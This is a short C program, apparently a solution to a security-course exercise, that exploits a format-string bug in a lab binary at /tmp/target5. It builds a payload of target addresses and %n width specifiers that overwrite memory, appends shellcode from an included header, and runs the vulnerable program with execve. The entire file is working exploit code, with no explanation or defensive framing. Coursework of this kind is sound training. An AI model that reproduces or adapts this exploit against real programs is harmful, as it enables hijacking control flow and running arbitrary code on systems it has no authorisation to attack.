#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char exploit[400];
  char sploit[100] = "\x90\xfd\xff\xbf\x90\xfd\xff\xbf\x91\xfd\xff\xbf\x91\xfd\xff\xbf\x92\xfd\xff\xbf\x92\xfd\xff\xbf\x93\xfd\xff\xbf\x93\xfd\xff\xbf %60s%n\n %416s%n\n %254s%n\n %190s%n\n";
  memcpy(exploit, sploit, strlen(sploit));
  memcpy(exploit + strlen(sploit), shellcode, sizeof(shellcode)-1);
  memset(exploit + strlen(sploit) + sizeof(shellcode) - 1, 0x42, 100);

  char *args[] = { TARGET, exploit, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
